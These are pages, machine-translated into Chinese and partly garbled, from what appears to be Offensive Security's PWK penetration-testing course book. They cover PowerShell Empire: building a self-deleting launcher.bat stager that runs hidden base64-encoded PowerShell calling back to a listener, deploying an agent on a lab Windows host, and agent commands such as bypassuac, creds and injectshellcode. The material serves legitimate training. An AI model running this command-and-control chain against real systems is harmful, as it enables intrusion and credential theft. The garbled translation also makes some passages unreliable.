<div style="position:absolute;top:131915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">723 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Hak5, 2019), https://hakshop.com/products/usb-rubber-ducky-deluxe</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:132043;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="112"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 112 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:132076;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:133153;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:133153;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:133153;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">729</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:132172;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">混淆    </font></font></nobr></div>
<div style="position:absolute;top:132172;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">假 假    </font></font></nobr></div>
<div style="position:absolute;top:132172;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">转变。</font><font style="vertical-align: inherit;">混淆启动器</font></font></nobr></div>
<div style="position:absolute;top:132188;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell 代码，使用</font></font></nobr></div>
<div style="position:absolute;top:132205;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ObfuscateCommand 用于混淆类型</font></font></nobr></div>
<div style="position:absolute;top:132222;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仅适用于 PowerShell。</font></font></nobr></div>
<div style="position:absolute;top:132240;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ObfuscateCommand False Token\All\1,Launcher\STDIN++\12467The Invoke-Obfuscatio</font></font></nobr></div>
<div style="position:absolute;top:132256;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仅在 Obfuscate 开关为 True 时使用</font></font></nobr></div>
<div style="position:absolute;top:132273;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仅适用于 PowerShell。</font></font></nobr></div>
<div style="position:absolute;top:132290;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语    </font></font></nobr></div>
<div style="position:absolute;top:132290;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">真的    </font></font></nobr></div>
<div style="position:absolute;top:132290;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">电源外壳    </font></font></nobr></div>
<div style="position:absolute;top:132290;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要生成的 stager 的语言。</font></font></nobr></div>
<div style="position:absolute;top:132307;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ProxyCreds False 默认    </font></font></nobr></div>
<div style="position:absolute;top:132307;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理凭据</font></font></nobr></div>
<div style="position:absolute;top:132324;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">([domain\]username:password) 使用 f</font></font></nobr></div>
<div style="position:absolute;top:132341;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求（默认、无或其他）。</font></font></nobr></div>
<div style="position:absolute;top:132358;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户代理    </font></font></nobr></div>
<div style="position:absolute;top:132358;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误的默认值    </font></font></nobr></div>
<div style="position:absolute;top:132358;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于雄鹿的用户代理字符串</font></font></nobr></div>
<div style="position:absolute;top:132375;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求（默认、无或其他）。</font></font></nobr></div>
<div style="position:absolute;top:132392;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理人    </font></font></nobr></div>
<div style="position:absolute;top:132392;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误的默认值    </font></font></nobr></div>
<div style="position:absolute;top:132392;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于请求的代理（默认，无</font></font></nobr></div>
<div style="position:absolute;top:132409;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或其他）。</font></font></nobr></div>
<div style="position:absolute;top:132426;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">删除    </font></font></nobr></div>
<div style="position:absolute;top:132426;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">假 真    </font></font></nobr></div>
<div style="position:absolute;top:132426;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">转变。</font><font style="vertical-align: inherit;">运行后删除.bat。</font></font></nobr></div>
<div style="position:absolute;top:132443;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">StagerRetries False 0    </font></font></nobr></div>
<div style="position:absolute;top:132443;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">stager 重试的时间</font></font></nobr></div>
<div style="position:absolute;top:132460;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接。</font></font></nobr></div>
<div style="position:absolute;top:132479;left:321"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 826 - launcher_bat stager 的选项</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:132509;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以</font><font style="vertical-align: inherit;">使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">set</font></font></b><font style="vertical-align: inherit;">命令后跟</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">监听器</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的名称</font><font style="vertical-align: inherit;">来配置</font><i><font style="vertical-align: inherit;">Listener</font></i><font style="vertical-align: inherit;">参数</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:132528;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们刚刚创建的监听器。</font><font style="vertical-align: inherit;">最后，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">execute</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建 stager，</font><font style="vertical-align: inherit;">如清单 827 所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:132563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帝国：stager/windows/launcher_bat) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置监听器 http</font></font></font></b></nobr></div>
<div style="position:absolute;top:132597;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：stager/windows/launcher_bat）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行</font></font></font></b></nobr></div>
<div style="position:absolute;top:132631;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] Stager 输出写到：/tmp/launcher.bat</font></font></nobr></div>
<div style="position:absolute;top:132665;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：stager/windows/launcher_bat）&gt; </font></font></nobr></div>
<div style="position:absolute;top:132684;left:357"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 827 - 创建 bat stager</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:132714;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了更好的理解我们刚刚创建的stager，我们来看一下部分内容</font></font></nobr></div>
<div style="position:absolute;top:132733;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成的 launcher.bat 文件。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:132768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/opt/Empire$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat /tmp/launcher.bat</font></font></font></b></nobr></div>
<div style="position:absolute;top:132785;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">@回声关闭</font></font></nobr></div>
<div style="position:absolute;top:132802;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始 /b powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAcwBp...</font></font></nobr></div>
<div style="position:absolute;top:132819;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始 /b "" cmd /c del "%~f0"&amp;exit /b</font></font></nobr></div>
<div style="position:absolute;top:132838;left:349"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 828 - PowerShell Empire stager</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:132867;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">stager 是一个 base64 编码的 PowerShell 命令字符串。</font><font style="vertical-align: inherit;">这个第一阶段的有效载荷将连接</font></font></nobr></div>
<div style="position:absolute;top:132887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到侦听器并获取其余的 Empire 代理代码。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:132921;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.1.3</font></font></i></nobr></div>
<div style="position:absolute;top:132921;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帝国特工</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:132959;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经运行了我们的监听器并准备好了我们的 stager，我们需要在上面部署一个代理</font></font></nobr></div>
<div style="position:absolute;top:132979;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">受害者。</font><font style="vertical-align: inherit;">代理只是 stager 检索到的最终有效载荷，它允许我们执行</font></font></nobr></div>
<div style="position:absolute;top:132998;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令并与系统交互。</font><font style="vertical-align: inherit;">stager（在本例中为 .bat 文件）删除自身并</font></font></nobr></div>
<div style="position:absolute;top:133017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行完成后退出。</font></font></nobr></div>
<div style="position:absolute;top:133050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦代理在目标上运行，它将建立一个 AES 加密的通信通道</font></font></nobr></div>
<div style="position:absolute;top:133070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 HTTP GET 和 POST 请求的数据部分的侦听器。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:133231;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="113"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 113 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:133264;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:134341;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:134341;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:134341;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">730</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:133360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将首先将 launcher.bat 脚本复制到 Windows 10 工作站并从</font></font></nobr></div>
<div style="position:absolute;top:133379;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令提示符。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:133648;left:364"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 316：启动器的执行</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:133678;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动脚本执行成功后，我们的Empire中会出现一个初始的代理调用</font></font></nobr></div>
<div style="position:absolute;top:133698;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话如清单 829 所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:133732;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire: stager/windows/launcher_bat) &gt; [+] 现在从 10.11.0.22 开始的初始代理 S2Y5XW1L</font></font></nobr></div>
<div style="position:absolute;top:133750;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">活动（松弛）</font></font></nobr></div>
<div style="position:absolute;top:133769;left:317"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 829 - PowerShell Empire 代理连接</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:133799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令来显示所有活动代理。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:133833;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：stager/windows/launcher_bat）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理</font></font></font></b></nobr></div>
<div style="position:absolute;top:133867;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 活跃代理：</font></font></nobr></div>
<div style="position:absolute;top:133901;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Name Lang 内部 IP 机器名 Username 进程    </font></font></nobr></div>
<div style="position:absolute;top:133901;left:733"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">延迟</font></font></nobr></div>
<div style="position:absolute;top:133918;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--------- ---- ----------- ------------ --------- ----- ——    </font></font></nobr></div>
<div style="position:absolute;top:133918;left:733"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----</font></font></nobr></div>
<div style="position:absolute;top:133935;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">S2Y5XW1L ps 10.11.0.22 CLIENT251 corp\offsec powershell/2976 5/0.0</font></font></nobr></div>
<div style="position:absolute;top:133969;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：特工）&gt; </font></font></nobr></div>
<div style="position:absolute;top:133989;left:317"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 830 - PowerShell Empire 代理连接</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:134018;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交互</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令后跟代理名称来与我们的代理进行交互</font></font></nobr></div>
<div style="position:absolute;top:134037;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并执行命令。</font></font></nobr></div>
<div style="position:absolute;top:134070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，我们将运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sysinfo</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来检索有关受感染主机的信息（清单 831）。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:134105;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：代理人）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">互动 S2Y5XW1L</font></font></font></b></nobr></div>
<div style="position:absolute;top:134139;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：S2Y5XW1L）&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sysinfo</font></font></font></b></nobr></div>
<div style="position:absolute;top:134173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：S2Y5XW1L）&gt; sysinfo：0|http://10.11.0.4:80|corp|offsec|CLIENT251|10.11.0.22|M</font></font></nobr></div>
<div style="position:absolute;top:134190;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">icrosoft Windows 10 Pro|假|powershell|2976|powershell|5</font></font></nobr></div>
<div style="position:absolute;top:134224;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听众：    </font></font></nobr></div>
<div style="position:absolute;top:134224;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://10.11.0.4:80</font></font></nobr></div>
<div style="position:absolute;top:134241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内部IP：10.11.0.22</font></font></nobr></div>
<div style="position:absolute;top:134258;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名：    </font></font></nobr></div>
<div style="position:absolute;top:134258;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公司\offsec</font></font></nobr></div>
<div style="position:absolute;top:134275;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机名：CLIENT251</font></font></nobr></div>
<div style="position:absolute;top:134292;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统：    </font></font></nobr></div>
<div style="position:absolute;top:134292;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软视窗 10 专业版 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:134419;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="114"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 114 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:134452;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:135529;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:135529;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:135529;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">731</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:134548;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">高完整性：0</font></font></nobr></div>
<div style="position:absolute;top:134564;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程名称：powershell</font></font></nobr></div>
<div style="position:absolute;top:134581;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程 ID：2976</font></font></nobr></div>
<div style="position:absolute;top:134598;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语：    </font></font></nobr></div>
<div style="position:absolute;top:134598;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">电源外壳</font></font></nobr></div>
<div style="position:absolute;top:134616;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语言版本：5</font></font></nobr></div>
<div style="position:absolute;top:134632;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:134652;left:330"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 831 - 执行 sysinfo 命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:134681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，该命令不会立即返回。</font><font style="vertical-align: inherit;">此延迟是由</font><i><font style="vertical-align: inherit;">DefaultDelay</font></i><font style="vertical-align: inherit;">引起的</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:134700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数，当前设置为默认值五秒。</font></font></nobr></div>
<div style="position:absolute;top:134733;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帮助</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令（清单832）显示所有可用的命令，如</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上传</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下载</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，并</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:134753;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">屏幕截图</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，这是不言自明的。</font><font style="vertical-align: inherit;">另外，我们可以使用</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shell</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来执行命令和</font></font></font></nobr></div>
<div style="position:absolute;top:134773;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">spawn</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在同一主机上创建一个额外的代理。</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:134807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：S2Y5XW1L）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帮助</font></font></font></b></nobr></div>
<div style="position:absolute;top:134841;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理命令</font></font></nobr></div>
<div style="position:absolute;top:134858;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==============</font></font></nobr></div>
<div style="position:absolute;top:134875;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理商    </font></font></nobr></div>
<div style="position:absolute;top:134875;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跳转到代理菜单。</font></font></nobr></div>
<div style="position:absolute;top:134892;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">背部    </font></font></nobr></div>
<div style="position:absolute;top:134892;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回菜单。</font></font></nobr></div>
<div style="position:absolute;top:134909;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">旁路导管    </font></font></nobr></div>
<div style="position:absolute;top:134909;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行 BypassUAC，为侦听器生成新的高完整性代理。 </font></font></nobr></div>
<div style="position:absolute;top:134926;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清除    </font></font></nobr></div>
<div style="position:absolute;top:134926;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清除代理任务。</font></font></nobr></div>
<div style="position:absolute;top:134943;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信用    </font></font></nobr></div>
<div style="position:absolute;top:134943;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示/返回数据库中的凭据。</font></font></nobr></div>
<div style="position:absolute;top:134960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下载    </font></font></nobr></div>
<div style="position:absolute;top:134960;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">委托代理下载文件。</font></font></nobr></div>
<div style="position:absolute;top:134977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出口    </font></font></nobr></div>
<div style="position:absolute;top:134977;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任务代理退出。</font></font></nobr></div>
<div style="position:absolute;top:134994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帮助    </font></font></nobr></div>
<div style="position:absolute;top:134994;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示特定命令的帮助菜单或语法。</font></font></nobr></div>
<div style="position:absolute;top:135011;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息    </font></font></nobr></div>
<div style="position:absolute;top:135011;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示有关此代理的信息</font></font></nobr></div>
<div style="position:absolute;top:135028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">injectshellcode 将侦听器 shellcode 注入远程进程。</font><font style="vertical-align: inherit;">前任。</font><font style="vertical-align: inherit;">注入shellcode</font></font></nobr></div>
<div style="position:absolute;top:135045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">职位    </font></font></nobr></div>
<div style="position:absolute;top:135045;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回作业或终止正在运行的作业。</font></font></nobr></div>
<div style="position:absolute;top:135062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">杀    </font></font></nobr></div>
<div style="position:absolute;top:135062;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任务代理杀死特定的进程名称或 ID。</font></font></nobr></div>
<div style="position:absolute;top:135079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">杀死日期    </font></font></nobr></div>
<div style="position:absolute;top:135079;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取或设置代理的终止日期 (01/01/2016)。</font></font></nobr></div>
<div style="position:absolute;top:135095;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列表    </font></font></nobr></div>
<div style="position:absolute;top:135095;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列出所有活动代理（或侦听器）。</font></font></nobr></div>
<div style="position:absolute;top:135112;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听众    </font></font></nobr></div>
<div style="position:absolute;top:135112;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跳转到听众菜单。</font></font></nobr></div>
<div style="position:absolute;top:135130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">丢失限制    </font></font></nobr></div>
<div style="position:absolute;top:135130;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">委托代理更改丢失代理检测的限制</font></font></nobr></div>
<div style="position:absolute;top:135147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主要的    </font></font></nobr></div>
